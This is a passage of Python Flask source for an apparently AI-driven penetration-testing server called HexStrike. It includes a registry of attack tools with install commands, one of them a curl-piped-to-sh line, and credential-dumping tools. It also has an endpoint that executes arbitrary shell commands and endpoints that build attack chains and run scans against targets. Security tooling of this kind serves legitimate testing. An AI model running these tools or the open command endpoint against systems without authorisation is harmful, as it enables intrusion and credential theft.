        "osint": {"total": len(osint_tools), "available": sum(1 for tool in osint_tools if tools_status.get(tool, False))},
        "exploitation": {"total": len(exploitation_tools), "available": sum(1 for tool in exploitation_tools if tools_status.get(tool, False))},
        "api": {"total": len(api_tools), "available": sum(1 for tool in api_tools if tools_status.get(tool, False))},
        "wireless": {"total": len(wireless_tools), "available": sum(1 for tool in wireless_tools if tools_status.get(tool, False))},
        "additional": {"total": len(additional_tools), "available": sum(1 for tool in additional_tools if tools_status.get(tool, False))},
        "active_directory": {"total": len(ad_tools), "available": sum(1 for tool in ad_tools if tools_status.get(tool, False))},
        "web_v7": {"total": len(web_tools_v7), "available": sum(1 for tool in web_tools_v7 if tools_status.get(tool, False))},
        "network_v7": {"total": len(network_tools_v7), "available": sum(1 for tool in network_tools_v7 if tools_status.get(tool, False))},
        "secrets_sast": {"total": len(secrets_tools), "available": sum(1 for tool in secrets_tools if tools_status.get(tool, False))},
        "mobile": {"total": len(mobile_tools), "available": sum(1 for tool in mobile_tools if tools_status.get(tool, False))},
        "post_exploitation": {"total": len(postex_tools), "available": sum(1 for tool in postex_tools if tools_status.get(tool, False))}
    }

    return jsonify({
        "status": "healthy",
        "message": "HexStrike AI Tools API Server is operational",
        "version": "7.0.0",
        "scope": scope_manager.list_scope(),
        "report_engine": {"findings_count": len(report_engine.findings)},
        "tools_status": tools_status,
        "all_essential_tools_available": all_essential_tools_available,
        "total_tools_available": sum(1 for tool, available in tools_status.items() if available),
        "total_tools_count": len(all_tools),
        "category_stats": category_stats,
        "cache_stats": cache.get_stats(),
        "telemetry": telemetry.get_stats(),
        "uptime": time.time() - telemetry.stats["start_time"]
    })

# ============================================================================
# TOOL STATUS / INVENTORY ENDPOINT (v7.0)
# ============================================================================

# Full tool registry: name → {category, engagements, install}
_TOOL_REGISTRY: List[Dict[str, Any]] = [
    # ── Core recon ───────────────────────────────────────────────────────────
    {"name": "nmap",                "category": "network",       "engagements": ["web","internal","ad","mobile","cloud"], "install": "apt install nmap"},
    {"name": "rustscan",            "category": "network",       "engagements": ["web","internal","ad"],                  "install": "cargo install rustscan  OR  apt install rustscan"},
    {"name": "masscan",             "category": "network",       "engagements": ["internal","ad"],                        "install": "apt install masscan"},
    {"name": "naabu",               "category": "network",       "engagements": ["web","internal"],                       "install": "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"},
    {"name": "dnsx",                "category": "network",       "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"},
    {"name": "tlsx",                "category": "network",       "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest"},
    {"name": "asnmap",              "category": "network",       "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest"},
    {"name": "shuffledns",          "category": "network",       "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"},
    {"name": "uncover",             "category": "network",       "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/uncover/cmd/uncover@latest"},
    {"name": "interactsh-client",   "category": "network",       "engagements": ["web","internal"],                       "install": "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"},
    # ── Web app ──────────────────────────────────────────────────────────────
    {"name": "httpx",               "category": "web",           "engagements": ["web","internal"],                       "install": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"},
    {"name": "gobuster",            "category": "web",           "engagements": ["web","internal"],                       "install": "apt install gobuster"},
    {"name": "ffuf",                "category": "web",           "engagements": ["web","internal"],                       "install": "apt install ffuf"},
    {"name": "feroxbuster",         "category": "web",           "engagements": ["web","internal"],                       "install": "apt install feroxbuster"},
    {"name": "nikto",               "category": "web",           "engagements": ["web","internal"],                       "install": "apt install nikto"},
    {"name": "nuclei",              "category": "web",           "engagements": ["web","internal","ad","cloud"],          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"},
    {"name": "sqlmap",              "category": "web",           "engagements": ["web"],                                  "install": "apt install sqlmap"},
    {"name": "dalfox",              "category": "web",           "engagements": ["web"],                                  "install": "go install github.com/hahwul/dalfox/v2@latest"},
    {"name": "ghauri",              "category": "web",           "engagements": ["web"],                                  "install": "pip install ghauri"},
    {"name": "katana",              "category": "web",           "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/katana/cmd/katana@latest"},
    {"name": "gau",                 "category": "web",           "engagements": ["web"],                                  "install": "go install github.com/lc/gau/v2/cmd/gau@latest"},
    {"name": "subfinder",           "category": "web",           "engagements": ["web"],                                  "install": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"},
    {"name": "subzy",               "category": "web",           "engagements": ["web"],                                  "install": "go install github.com/LukaSikic/subzy@latest"},
    {"name": "crlfuzz",             "category": "web",           "engagements": ["web"],                                  "install": "go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest"},
    {"name": "nomore403",           "category": "web",           "engagements": ["web","internal"],                       "install": "go install github.com/devploit/nomore403@latest"},
    {"name": "graphql-cop",         "category": "web",           "engagements": ["web"],                                  "install": "pip install graphql-cop"},
    {"name": "commix",              "category": "web",           "engagements": ["web"],                                  "install": "apt install commix"},
    {"name": "corsy",               "category": "web",           "engagements": ["web"],                                  "install": "pip install corsy"},
    {"name": "jwt_tool",            "category": "web",           "engagements": ["web"],                                  "install": "git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool && pip install -r /opt/jwt_tool/requirements.txt"},
    # ── Visual recon ─────────────────────────────────────────────────────────
    {"name": "gowitness",           "category": "visual_recon",  "engagements": ["web","internal","ad"],                  "install": "go install github.com/sensepost/gowitness@latest"},
    {"name": "chromium",            "category": "visual_recon",  "engagements": ["web","internal","ad"],                  "install": "apt install chromium  (required by gowitness)"},
    # ── Source exposure ──────────────────────────────────────────────────────
    {"name": "git-dumper",          "category": "web",           "engagements": ["web"],                                  "install": "pip install git-dumper"},
    # ── Active Directory ─────────────────────────────────────────────────────
    {"name": "nxc",                 "category": "active_directory", "engagements": ["ad","internal"],                     "install": "apt install netexec  OR  pip install netexec"},
    {"name": "bloodhound-python",   "category": "active_directory", "engagements": ["ad"],                               "install": "pip install bloodhound"},
    {"name": "kerbrute",            "category": "active_directory", "engagements": ["ad"],                               "install": "go install github.com/ropnop/kerbrute@latest"},
    {"name": "certipy-ad",          "category": "active_directory", "engagements": ["ad"],                               "install": "pip install certipy-ad"},
    {"name": "ldapdomaindump",      "category": "active_directory", "engagements": ["ad"],                               "install": "pip install ldapdomaindump"},
    {"name": "lsassy",              "category": "active_directory", "engagements": ["ad"],                               "install": "pip install lsassy"},
    {"name": "coercer",             "category": "active_directory", "engagements": ["ad"],                               "install": "pip install coercer"},
    {"name": "impacket-secretsdump","category": "active_directory", "engagements": ["ad"],                               "install": "pip install impacket"},
    {"name": "impacket-ntlmrelayx", "category": "active_directory", "engagements": ["ad","internal"],                   "install": "pip install impacket"},
    {"name": "mitm6",               "category": "active_directory", "engagements": ["ad","internal"],                   "install": "pip install mitm6"},
    {"name": "enum4linux-ng",       "category": "active_directory", "engagements": ["ad","internal"],                   "install": "apt install enum4linux-ng  OR  pip install enum4linux-ng"},
    {"name": "rpcclient",           "category": "active_directory", "engagements": ["ad","internal"],                   "install": "apt install samba-common-bin"},
    # ── Secrets & SAST ───────────────────────────────────────────────────────
    {"name": "trufflehog",          "category": "secrets",       "engagements": ["web","secrets","devsecops"],            "install": "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin"},
    {"name": "gitleaks",            "category": "secrets",       "engagements": ["web","secrets","devsecops"],            "install": "apt install gitleaks"},
    {"name": "semgrep",             "category": "secrets",       "engagements": ["web","secrets","devsecops"],            "install": "pip install semgrep"},
    # ── Mobile ───────────────────────────────────────────────────────────────
    {"name": "frida",               "category": "mobile",        "engagements": ["mobile"],                               "install": "pip install frida-tools"},
    {"name": "objection",           "category": "mobile",        "engagements": ["mobile"],                               "install": "pip install objection"},
    {"name": "apktool",             "category": "mobile",        "engagements": ["mobile"],                               "install": "apt install apktool"},
    {"name": "apkleaks",            "category": "mobile",        "engagements": ["mobile"],                               "install": "pip install apkleaks"},
    {"name": "jadx",                "category": "mobile",        "engagements": ["mobile"],                               "install": "Download from https://github.com/skylot/jadx/releases"},
    # ── Cloud ────────────────────────────────────────────────────────────────
    {"name": "prowler",             "category": "cloud",         "engagements": ["cloud"],                                "install": "pip install prowler"},
    {"name": "trivy",               "category": "cloud",         "engagements": ["cloud","devsecops"],                    "install": "apt install trivy  OR  https://aquasecurity.github.io/trivy"},
    {"name": "checkov",             "category": "cloud",         "engagements": ["cloud","devsecops"],                    "install": "pip install checkov"},
    {"name": "s3scanner",           "category": "cloud",         "engagements": ["cloud"],                                "install": "pip install s3scanner"},
    {"name": "cloudbrute",          "category": "cloud",         "engagements": ["cloud"],                                "install": "go install github.com/0xsha/cloudbrute@latest"},
    {"name": "enumerate-iam",       "category": "cloud",         "engagements": ["cloud"],                                "install": "pip install enumerate-iam"},
    # ── Password attacks ─────────────────────────────────────────────────────
    {"name": "hydra",               "category": "passwords",     "engagements": ["web","internal","ad"],                  "install": "apt install hydra"},
    {"name": "hashcat",             "category": "passwords",     "engagements": ["ad","internal"],                        "install": "apt install hashcat"},
    {"name": "john",                "category": "passwords",     "engagements": ["ad","internal"],                        "install": "apt install john"},
    {"name": "medusa",              "category": "passwords",     "engagements": ["web","internal"],                       "install": "apt install medusa"},
    # ── Post-exploitation / pivoting ─────────────────────────────────────────
    {"name": "ligolo-ng",           "category": "pivoting",      "engagements": ["internal","ad"],                        "install": "https://github.com/nicocha30/ligolo-ng/releases"},
    {"name": "chisel",              "category": "pivoting",      "engagements": ["internal","ad"],                        "install": "https://github.com/jpillora/chisel/releases"},
    {"name": "msfconsole",          "category": "exploitation",  "engagements": ["web","internal","ad"],                  "install": "apt install metasploit-framework"},
    # ── OSINT ────────────────────────────────────────────────────────────────
    {"name": "amass",               "category": "osint",         "engagements": ["web"],                                  "install": "apt install amass  OR  go install github.com/owasp-amass/amass/v4/...@master"},
    {"name": "theharvester",        "category": "osint",         "engagements": ["web"],                                  "install": "apt install theharvester"},
    {"name": "sherlock",            "category": "osint",         "engagements": ["web"],                                  "install": "pip install sherlock-project"},
]

# Engagement type → which categories are "core" for it
_ENGAGEMENT_CORE_CATEGORIES = {
    "web":      ["network", "web", "visual_recon", "secrets", "passwords"],
    "internal": ["network", "web", "active_directory", "pivoting", "passwords"],
    "ad":       ["active_directory", "network", "passwords", "pivoting"],
    "mobile":   ["mobile", "secrets"],
    "cloud":    ["cloud", "secrets", "network"],
    "devsecops":["secrets"],
    "secrets":  ["secrets"],
}


@app.route("/api/tools/status", methods=["GET"])
@require_api_key
def tool_status():
    """
    Fast tool inventory using shutil.which — no subprocess overhead.

    Returns:
      - by_category: {category: {installed: [...], missing: [...]}}
      - by_engagement: readiness score per engagement type (web, internal, ad, mobile, cloud)
      - missing_critical: tools missing from ALL engagement core categories
      - install_commands: dict of tool → install command for all missing tools
      - summary: total installed / total tracked
    """
    import shutil

    # Check each tool
    checked: Dict[str, bool] = {}
    for entry in _TOOL_REGISTRY:
        name = entry["name"]
        if name not in checked:
            checked[name] = shutil.which(name) is not None

    # Group by category
    by_category: Dict[str, Dict[str, List[str]]] = {}
    for entry in _TOOL_REGISTRY:
        cat  = entry["category"]
        name = entry["name"]
        if cat not in by_category:
            by_category[cat] = {"installed": [], "missing": []}
        if checked[name]:
            by_category[cat]["installed"].append(name)
        else:
            by_category[cat]["missing"].append(name)

    # Readiness per engagement type
    by_engagement: Dict[str, Dict[str, Any]] = {}
    for eng, core_cats in _ENGAGEMENT_CORE_CATEGORIES.items():
        core_tools = [e["name"] for e in _TOOL_REGISTRY if e["category"] in core_cats]
        installed  = [t for t in core_tools if checked.get(t)]
        missing    = [t for t in core_tools if not checked.get(t)]
        pct = round(100 * len(installed) / len(core_tools), 1) if core_tools else 100.0
        by_engagement[eng] = {
            "readiness_pct":   pct,
            "installed_count": len(installed),
            "total_count":     len(core_tools),
            "missing":         missing
        }

    # Install commands for all missing tools
    install_cmds = {
        e["name"]: e["install"]
        for e in _TOOL_REGISTRY
        if not checked.get(e["name"])
    }

    # Critical missing = missing in ANY core category across all engagements
    all_core = {e["name"] for e in _TOOL_REGISTRY
                if e["category"] in {"network", "web", "active_directory", "secrets", "passwords"}}
    missing_critical = sorted(t for t in all_core if not checked.get(t))

    total_installed = sum(1 for v in checked.values() if v)
    total_tracked   = len(checked)

    return jsonify({
        "success":          True,
        "summary": {
            "installed":        total_installed,
            "missing":          total_tracked - total_installed,
            "total_tracked":    total_tracked,
            "coverage_pct":     round(100 * total_installed / total_tracked, 1) if total_tracked else 0
        },
        "by_category":      by_category,
        "by_engagement":    by_engagement,
        "missing_critical": missing_critical,
        "install_commands": install_cmds,
        "timestamp":        datetime.now().isoformat()
    })


@app.route("/api/command", methods=["POST"])
@require_api_key
def generic_command():
    """Execute any command provided in the request with enhanced logging"""
    try:
        params = request.json
        command = params.get("command", "")
        use_cache = params.get("use_cache", True)

        if not command:
            logger.warning("⚠️  Command endpoint called without command parameter")
            return jsonify({
                "error": "Command parameter is required"
            }), 400

        result = execute_command(command, use_cache=use_cache)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in command endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# File Operations API Endpoints

@app.route("/api/files/create", methods=["POST"])
@require_api_key
def create_file():
    """Create a new file"""
    try:
        params = request.json
        filename = params.get("filename", "")
        content = params.get("content", "")
        binary = params.get("binary", False)

        if not filename:
            return jsonify({"error": "Filename is required"}), 400

        result = file_manager.create_file(filename, content, binary)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error creating file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/modify", methods=["POST"])
@require_api_key
def modify_file():
    """Modify an existing file"""
    try:
        params = request.json
        filename = params.get("filename", "")
        content = params.get("content", "")
        append = params.get("append", False)

        if not filename:
            return jsonify({"error": "Filename is required"}), 400

        result = file_manager.modify_file(filename, content, append)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error modifying file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/delete", methods=["DELETE"])
@require_api_key
def delete_file():
    """Delete a file or directory"""
    try:
        params = request.json
        filename = params.get("filename", "")

        if not filename:
            return jsonify({"error": "Filename is required"}), 400

        result = file_manager.delete_file(filename)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error deleting file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/list", methods=["GET"])
def list_files():
    """List files in a directory"""
    try:
        directory = request.args.get("directory", ".")
        result = file_manager.list_files(directory)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error listing files: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Payload Generation Endpoint
@app.route("/api/payloads/generate", methods=["POST"])
@require_api_key
def generate_payload():
    """Generate large payloads for testing"""
    try:
        params = request.json
        payload_type = params.get("type", "buffer")
        size = params.get("size", 1024)
        pattern = params.get("pattern", "A")
        filename = params.get("filename", f"payload_{int(time.time())}")

        if size > 100 * 1024 * 1024:  # 100MB limit
            return jsonify({"error": "Payload size too large (max 100MB)"}), 400

        if payload_type == "buffer":
            content = pattern * (size // len(pattern))
        elif payload_type == "cyclic":
            # Generate cyclic pattern
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            content = ""
            for i in range(size):
                content += alphabet[i % len(alphabet)]
        elif payload_type == "random":
            import random
            import string
            content = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
        else:
            return jsonify({"error": "Invalid payload type"}), 400

        result = file_manager.create_file(filename, content)
        result["payload_info"] = {
            "type": payload_type,
            "size": size,
            "pattern": pattern
        }

        logger.info(f"🎯 Generated {payload_type} payload: {filename} ({size} bytes)")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error generating payload: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Cache Management Endpoint
@app.route("/api/cache/stats", methods=["GET"])
def cache_stats():
    """Get cache statistics"""
    return jsonify(cache.get_stats())

@app.route("/api/cache/clear", methods=["POST"])
@require_api_key
def clear_cache():
    """Clear the cache"""
    cache.cache.clear()
    cache.stats = {"hits": 0, "misses": 0, "evictions": 0}
    logger.info("🧹 Cache cleared")
    return jsonify({"success": True, "message": "Cache cleared"})

# Telemetry Endpoint
@app.route("/api/telemetry", methods=["GET"])
def get_telemetry():
    """Get system telemetry"""
    return jsonify(telemetry.get_stats())

# ============================================================================
# PROCESS MANAGEMENT API ENDPOINTS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/processes/list", methods=["GET"])
def list_processes():
    """List all active processes"""
    try:
        processes = ProcessManager.list_active_processes()

        # Add calculated fields for each process
        for pid, info in processes.items():
            runtime = time.time() - info["start_time"]
            info["runtime_formatted"] = f"{runtime:.1f}s"

            if info["progress"] > 0:
                eta = (runtime / info["progress"]) * (1.0 - info["progress"])
                info["eta_formatted"] = f"{eta:.1f}s"
            else:
                info["eta_formatted"] = "Unknown"

        return jsonify({
            "success": True,
            "active_processes": processes,
            "total_count": len(processes)
        })
    except Exception as e:
        logger.error(f"💥 Error listing processes: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/status/<int:pid>", methods=["GET"])
def get_process_status(pid):
    """Get status of a specific process"""
    try:
        process_info = ProcessManager.get_process_status(pid)

        if process_info:
            # Add calculated fields
            runtime = time.time() - process_info["start_time"]
            process_info["runtime_formatted"] = f"{runtime:.1f}s"

            if process_info["progress"] > 0:
                eta = (runtime / process_info["progress"]) * (1.0 - process_info["progress"])
                process_info["eta_formatted"] = f"{eta:.1f}s"
            else:
                process_info["eta_formatted"] = "Unknown"

            return jsonify({
                "success": True,
                "process": process_info
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Process {pid} not found"
            }), 404

    except Exception as e:
        logger.error(f"💥 Error getting process status: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/terminate/<int:pid>", methods=["POST"])
@require_api_key
def terminate_process(pid):
    """Terminate a specific process"""
    try:
        success = ProcessManager.terminate_process(pid)

        if success:
            logger.info(f"🛑 Process {pid} terminated successfully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} terminated successfully"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to terminate process {pid} or process not found"
            }), 404

    except Exception as e:
        logger.error(f"💥 Error terminating process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/pause/<int:pid>", methods=["POST"])
@require_api_key
def pause_process(pid):
    """Pause a specific process"""
    try:
        success = ProcessManager.pause_process(pid)

        if success:
            logger.info(f"⏸️ Process {pid} paused successfully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} paused successfully"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to pause process {pid} or process not found"
            }), 404

    except Exception as e:
        logger.error(f"💥 Error pausing process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/resume/<int:pid>", methods=["POST"])
@require_api_key
def resume_process(pid):
    """Resume a paused process"""
    try:
        success = ProcessManager.resume_process(pid)

        if success:
            logger.info(f"▶️ Process {pid} resumed successfully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} resumed successfully"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to resume process {pid} or process not found"
            }), 404

    except Exception as e:
        logger.error(f"💥 Error resuming process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/dashboard", methods=["GET"])
def process_dashboard():
    """Get enhanced process dashboard with visual status using ModernVisualEngine"""
    try:
        processes = ProcessManager.list_active_processes()
        current_time = time.time()

        # Create beautiful dashboard using ModernVisualEngine
        dashboard_visual = ModernVisualEngine.create_live_dashboard(processes)

        dashboard = {
            "timestamp": datetime.now().isoformat(),
            "total_processes": len(processes),
            "visual_dashboard": dashboard_visual,
            "processes": [],
            "system_load": {
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_percent": psutil.virtual_memory().percent,
                "active_connections": len(psutil.net_connections())
            }
        }

        for pid, info in processes.items():
            runtime = current_time - info["start_time"]
            progress_fraction = info.get("progress", 0)

            # Create beautiful progress bar using ModernVisualEngine
            progress_bar = ModernVisualEngine.render_progress_bar(
                progress_fraction,
                width=25,
                style='cyber',
                eta=info.get("eta", 0)
            )

            process_status = {
                "pid": pid,
                "command": info["command"][:60] + "..." if len(info["command"]) > 60 else info["command"],
                "status": info["status"],
                "runtime": f"{runtime:.1f}s",
                "progress_percent": f"{progress_fraction * 100:.1f}%",
                "progress_bar": progress_bar,
                "eta": f"{info.get('eta', 0):.0f}s" if info.get('eta', 0) > 0 else "Calculating...",
                "bytes_processed": info.get("bytes_processed", 0),
                "last_output": info.get("last_output", "")[:100]
            }
            dashboard["processes"].append(process_status)

        return jsonify(dashboard)

    except Exception as e:
        logger.error(f"💥 Error getting process dashboard: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/visual/vulnerability-card", methods=["POST"])
@require_api_key
def create_vulnerability_card():
    """Create a beautiful vulnerability card using ModernVisualEngine"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400

        # Create vulnerability card
        card = ModernVisualEngine.render_vulnerability_card(data)

        return jsonify({
            "success": True,
            "vulnerability_card": card,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating vulnerability card: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/visual/summary-report", methods=["POST"])
@require_api_key
def create_summary_report():
    """Create a beautiful summary report using ModernVisualEngine"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400

        # Create summary report
        visual_engine = ModernVisualEngine()
        report = visual_engine.create_summary_report(data)

        return jsonify({
            "success": True,
            "summary_report": report,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating summary report: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/visual/tool-output", methods=["POST"])
@require_api_key
def format_tool_output():
    """Format tool output using ModernVisualEngine"""
    try:
        data = request.get_json()
        if not data or 'tool' not in data or 'output' not in data:
            return jsonify({"error": "Tool and output data required"}), 400

        tool = data['tool']
        output = data['output']
        success = data.get('success', True)

        # Format tool output
        formatted_output = ModernVisualEngine.format_tool_output(tool, output, success)

        return jsonify({
            "success": True,
            "formatted_output": formatted_output,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error formatting tool output: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# INTELLIGENT DECISION ENGINE API ENDPOINTS
# ============================================================================

@app.route("/api/intelligence/analyze-target", methods=["POST"])
@require_api_key
def analyze_target():
    """Analyze target and create comprehensive profile using Intelligent Decision Engine"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        logger.info(f"🧠 Analyzing target: {target}")

        # Use the decision engine to analyze the target
        profile = decision_engine.analyze_target(target)

        logger.info(f"✅ Target analysis completed for {target}")
        logger.info(f"📊 Target type: {profile.target_type.value}, Risk level: {profile.risk_level}")

        return jsonify({
            "success": True,
            "target_profile": profile.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error analyzing target: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/select-tools", methods=["POST"])
@require_api_key
def select_optimal_tools():
    """Select optimal tools based on target profile and objective"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        objective = data.get('objective', 'comprehensive')  # comprehensive, quick, stealth

        logger.info(f"🎯 Selecting optimal tools for {target} with objective: {objective}")

        # Analyze target first
        profile = decision_engine.analyze_target(target)

        # Select optimal tools
        selected_tools = decision_engine.select_optimal_tools(profile, objective)

        logger.info(f"✅ Selected {len(selected_tools)} tools for {target}")

        return jsonify({
            "success": True,
            "target": target,
            "objective": objective,
            "target_profile": profile.to_dict(),
            "selected_tools": selected_tools,
            "tool_count": len(selected_tools),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error selecting tools: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/optimize-parameters", methods=["POST"])
@require_api_key
def optimize_tool_parameters():
    """Optimize tool parameters based on target profile and context"""
    try:
        data = request.get_json()
        if not data or 'target' not in data or 'tool' not in data:
            return jsonify({"error": "Target and tool are required"}), 400

        target = data['target']
        tool = data['tool']
        context = data.get('context', {})

        logger.info(f"⚙️  Optimizing parameters for {tool} against {target}")

        # Analyze target first
        profile = decision_engine.analyze_target(target)

        # Optimize parameters
        optimized_params = decision_engine.optimize_parameters(tool, profile, context)

        logger.info(f"✅ Parameters optimized for {tool}")

        return jsonify({
            "success": True,
            "target": target,
            "tool": tool,
            "context": context,
            "target_profile": profile.to_dict(),
            "optimized_parameters": optimized_params,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error optimizing parameters: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/create-attack-chain", methods=["POST"])
@require_api_key
def create_attack_chain():
    """Create an intelligent attack chain based on target profile"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        objective = data.get('objective', 'comprehensive')

        logger.info(f"⚔️  Creating attack chain for {target} with objective: {objective}")

        # Analyze target first
        profile = decision_engine.analyze_target(target)

        # Create attack chain
        attack_chain = decision_engine.create_attack_chain(profile, objective)

        logger.info(f"✅ Attack chain created with {len(attack_chain.steps)} steps")
        logger.info(f"📊 Success probability: {attack_chain.success_probability:.2f}, Estimated time: {attack_chain.estimated_time}s")

        return jsonify({
            "success": True,
            "target": target,
            "objective": objective,
            "target_profile": profile.to_dict(),
            "attack_chain": attack_chain.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating attack chain: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/smart-scan", methods=["POST"])
@require_api_key
def intelligent_smart_scan():
    """Execute an intelligent scan using AI-driven tool selection and parameter optimization with parallel execution"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        objective = data.get('objective', 'comprehensive')
        max_tools = data.get('max_tools', 5)

        logger.info(f"🚀 Starting intelligent smart scan for {target}")

        # Analyze target
        profile = decision_engine.analyze_target(target)

        # Select optimal tools
        selected_tools = decision_engine.select_optimal_tools(profile, objective)[:max_tools]

        # Execute tools in parallel with real tool execution
        scan_results = {
            "target": target,
            "target_profile": profile.to_dict(),
            "tools_executed": [],
            "total_vulnerabilities": 0,
            "execution_summary": {},
            "combined_output": ""
        }

        def execute_single_tool(tool_name, target, profile):
            """Execute a single tool and return results"""
            try:
                logger.info(f"🔧 Executing {tool_name} with optimized parameters")

                # Get optimized parameters for this tool
                optimized_params = decision_engine.optimize_parameters(tool_name, profile)

                # Map tool names to their actual execution functions
                tool_execution_map = {
                    'nmap': lambda: execute_nmap_scan(target, optimized_params),
                    'gobuster': lambda: execute_gobuster_scan(target, optimized_params),
                    'nuclei': lambda: execute_nuclei_scan(target, optimized_params),
                    'nikto': lambda: execute_nikto_scan(target, optimized_params),
                    'sqlmap': lambda: execute_sqlmap_scan(target, optimized_params),
                    'ffuf': lambda: execute_ffuf_scan(target, optimized_params),
                    'feroxbuster': lambda: execute_feroxbuster_scan(target, optimized_params),
                    'katana': lambda: execute_katana_scan(target, optimized_params),
                    'httpx': lambda: execute_httpx_scan(target, optimized_params),
                    'wpscan': lambda: execute_wpscan_scan(target, optimized_params),
                    'dirsearch': lambda: execute_dirsearch_scan(target, optimized_params),
                    'arjun': lambda: execute_arjun_scan(target, optimized_params),
                    'paramspider': lambda: execute_paramspider_scan(target, optimized_params),
                    'dalfox': lambda: execute_dalfox_scan(target, optimized_params),
                    'amass': lambda: execute_amass_scan(target, optimized_params),
                    'subfinder': lambda: execute_subfinder_scan(target, optimized_params)
                }

                # Execute the tool if we have a mapping for it
                if tool_name in tool_execution_map:
                    result = tool_execution_map[tool_name]()

                    # Extract vulnerability count from result
                    vuln_count = 0
                    if result.get('success') and result.get('stdout'):
                        # Simple vulnerability detection based on common patterns
                        output = result.get('stdout', '')
                        vuln_indicators = ['CRITICAL', 'HIGH', 'MEDIUM', 'VULNERABILITY', 'EXPLOIT', 'SQL injection', 'XSS', 'CSRF']
                        vuln_count = sum(1 for indicator in vuln_indicators if indicator.lower() in output.lower())

                    return {
                        "tool": tool_name,
                        "parameters": optimized_params,
                        "status": "success" if result.get('success') else "failed",
                        "timestamp": datetime.now().isoformat(),
                        "execution_time": result.get('execution_time', 0),
                        "stdout": result.get('stdout', ''),
                        "stderr": result.get('stderr', ''),
                        "vulnerabilities_found": vuln_count,
                        "command": result.get('command', ''),
                        "success": result.get('success', False)
                    }
                else:
                    logger.warning(f"⚠️ No execution mapping found for tool: {tool_name}")
                    return {
                        "tool": tool_name,
                        "parameters": optimized_params,
                        "status": "skipped",
                        "timestamp": datetime.now().isoformat(),
